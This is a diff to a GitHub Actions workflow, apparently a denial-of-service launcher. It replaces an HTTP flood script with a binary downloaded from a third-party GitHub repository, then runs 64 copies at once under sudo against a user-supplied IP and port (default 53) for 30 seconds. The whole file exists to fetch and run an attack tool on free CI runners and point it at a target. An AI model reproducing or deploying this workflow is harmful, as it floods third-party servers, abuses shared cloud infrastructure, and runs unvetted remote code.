@@ -1,13 +1,17 @@
-name: RAW !
+name: Tekil !
 
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: "Site !"
+        description: "IP !"
         required: true
-        default: "http://127.0.0.1/"
-
+        default: "127.0.0.1"
+      port:
+        description: "Port !"
+        required: true
+        default: "53"
+      
 jobs:
   vds:
     runs-on: ubuntu-latest
@@ -23,13 +27,14 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/HTTP-RAW.js -O RAW.js
-          chmod +x RAW.js || true
+          PORT="${{ inputs.port }}"
+          
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O Tekil
+          chmod +x Tekil || true
 
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 45 node RAW.js "$TARGET" 45 &
+          for i in {1..64}; do
+            sudo timeout 30 ./Tekil "$TARGET" "$PORT" &
             PIDS+=($!)
           done
 
@@ -39,5 +44,5 @@ jobs:
 
       - name: Finish !
         run: |
-          sleep 45
+          sleep 30
           exit 0
